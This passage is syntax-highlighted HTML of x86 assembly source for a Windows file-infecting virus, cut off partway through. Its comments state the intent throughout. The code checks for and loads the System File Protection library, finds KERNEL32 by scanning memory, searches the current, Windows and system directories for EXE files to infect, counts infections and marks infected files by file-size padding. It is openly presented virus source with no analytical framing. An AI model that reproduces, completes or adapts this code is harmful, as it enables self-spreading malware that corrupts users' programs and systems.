        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrCore</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NoSFC</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Load SFC.DLL</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetPtrSFCName</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SFC.DLL'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">GetPtrSFCName</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hSFCDLL</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoSFC</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Find SFC API addresses</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumSFCApis</span><span class="sc0">              
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CRC32SFCApis</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">epSFCApis</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_APIs</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">NoSFC</span><span class="sc0">

</span><span class="sc5">FreeSFC</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hSFCDLL</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SfcNotLoaded</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hSFCDLL</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_FreeLibrary</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">SfcNotLoaded</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 
                
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Infect files before returning to host</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">NoSFC</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">search_files</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Back to host</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">ErrCore</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FreeSFC</span><span class="sc0"> 

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Find base address of KERNEL32.DLL </span><span class="sc0">
</span><span class="sc1">;Thanks to Jacky Qwerty for the SEH routines</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">SEH_Block_0000</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,-</span><span class="sc5">cPushad</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GNtBA_L1</span><span class="sc0">
                </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">IGetNtBaseAddr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SEH_Block_0000</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">GNtBA_L0</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">GNtBA_L2</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">10000h</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,-</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GNtBA_L1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,-</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">GNtBA_L1</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">eax.NT_OptionalHeader.OH_DirectoryEntries.</span><span class="sc0"> \
                         </span><span class="sc5">DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.ED_Name</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufStrFilename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">parse_filename</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_str_crc32</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CrcKernel32</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Is KERNEL32.DLL ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">k32_f</span><span class="sc0">
</span><span class="sc5">GNtBA_L1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GNtBA_L0</span><span class="sc0">

</span><span class="sc5">k32_f</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">GNtBA_L2</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Search for target files in current, windows and system directories</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Try to infect files in current directory</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">search_files</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufGetDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">try_windir</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_in_dir</span><span class="sc0">
                                
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Try to infect files in \WINDOWS directory</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">try_windir</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufGetDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">try_sysdir</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_in_dir</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Try to infect files in \SYSTEM directory</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">try_sysdir</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufGetDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetSystemDirectoryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_in_dir</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Search for files to infect in the specified directory</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Dont infect files in the root directory</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">do_in_dir</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">exit_in_dir</span><span class="sc0">              

</span><span class="sc5">dir_complete</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DirectFindData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufGetDir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Insert *.EXE next to path</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">direct_Null</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">direct_Null</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">00000001h</span><span class="sc4">],</span><span class="sc13">"\"
</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This is '*.EXE',00h</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'XE.*'</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0045h</span><span class="sc0">                
        </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Reset number of files infected on this virus execution</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumInfected</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;First find try</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit_in_dir</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">h_Find</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Skip directories, compressed and system files</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">work_with_WFD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0">                 \
                   </span><span class="sc5">DirectFindData</span><span class="sc4">+</span><span class="sc0">          \
                   </span><span class="sc5">WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">  </span><span class="sc6">or</span><span class="sc0">            \
            </span><span class="sc5">FILE_ATTRIBUTE_COMPRESSED</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">            \
            </span><span class="sc5">FILE_ATTRIBUTE_SYSTEM</span><span class="sc0">

        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">DirectAgain</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Check if file size is allowed</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0">                 \
                   </span><span class="sc5">DirectFindData</span><span class="sc4">+</span><span class="sc0">          \
                   </span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">DirectAgain</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFFFFFFh</span><span class="sc4">-(</span><span class="sc5">size_virtual</span><span class="sc4">+</span><span class="sc2">4000h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">DirectAgain</span><span class="sc0">             
                
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Check if file is already infected</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">SIZE_PADDING</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000065h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZE_PADDING</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DirectAgain</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get complete path+filename and convert it to upper case</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufGetDir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufStrFilename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">parse_filename</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0">                 \
                   </span><span class="sc5">DirectFindData</span><span class="sc4">+</span><span class="sc0">          \
                   </span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">parse_filename</span><span class="sc0">

</span><span class="sc1">;       al  -&gt; Null</span><span class="sc0">
</span><span class="sc1">;       edx -&gt; Points to filename at the end of path</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; Points 1byte above the null terminator</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Avoid some files from being infected</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">CheckFileName</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_crc32</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">avoid_tbl</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">avoid_num</span><span class="sc0">
</span><span class="sc5">AvoidLoop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextAvoid</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">DirectAgain</span><span class="sc0">

</span><span class="sc5">NextAvoid</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">AvoidLoop</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CheckFileName</span><span class="sc0">       
        
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Check if file is protected by Window System File Protection</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">system_version</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NotProtected</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hSFCDLL</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NotProtected</span><span class="sc0">
